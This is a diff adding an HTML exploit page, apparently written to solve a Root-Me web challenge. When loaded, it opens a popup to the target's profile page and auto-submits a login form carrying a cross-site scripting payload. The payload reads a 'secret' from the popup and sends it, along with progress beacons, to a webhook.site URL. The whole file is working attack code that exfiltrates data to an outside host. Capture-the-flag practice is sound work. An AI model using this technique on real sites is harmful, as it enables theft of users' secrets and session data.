@@ -1,0 +1,23 @@
+<!doctype html><html><head><meta charset="utf-8"><title>v6</title></head><body>
+<h1>v6</h1>
+<script>
+var CH='http://challenge01.root-me.org:58003';
+var U='https://webhook.site/af9addd2-9c27-4b22-aad4-0001211f0c67';
+function b(k,v){try{fetch(U+'?'+k+'='+encodeURIComponent(String(v==null?'1':v)).slice(0,150));}catch(e){}}
+var PAY='<script>(function(){var U=\'https://webhook.site/af9addd2-9c27-4b22-aad4-0001211f0c67\';function b(k,v){try{fetch(U+\'?\'+k+\'=\'+encodeURIComponent(String(v||\'1\')).slice(0,150));}catch(e){}}b(\'payload\',\'fired\');var n=0;var t=setInterval(function(){n++;try{var w=window.open(\'\',\'pop1\');if(!w){b(\'err\',\'pop1-null\');clearInterval(t);return;}var d=w.document;var tx=(d.body?d.body.innerText:\'\')||\'\';if(tx.toLowerCase().indexOf(\'secret\')>-1&&tx.indexOf(\':\')>-1){var k2=tx.split(\':\');var s=k2[k2.length-1].trim();if(s){b(\'secret\',s);clearInterval(t);}}if(n>16){b(\'err\',\'timeout\');clearInterval(t);}}catch(e){b(\'err\',String(e).slice(0,140));clearInterval(t);}},250);})();<\/script>';
+b('w1');
+var p1=window.open(CH+'/profile','pop1');
+b('pop1',p1?'ok':'null');
+setTimeout(function(){
+  var f=document.createElement('form');
+  f.method='POST';f.action=CH+'/login';f.target='_self';
+  var u=document.createElement('input');u.name='username';u.value=PAY;
+  var s=document.createElement('input');s.name='secret';s.value='x6';
+  f.appendChild(u);f.appendChild(s);document.body.appendChild(f);f.submit();
+  b('posted','1');
+  setTimeout(function(){b('t1','1');},1000);
+  setTimeout(function(){b('t3','1');},3000);
+  setTimeout(function(){b('t5','1');},5000);
+},400);
+</script>
+</body></html>
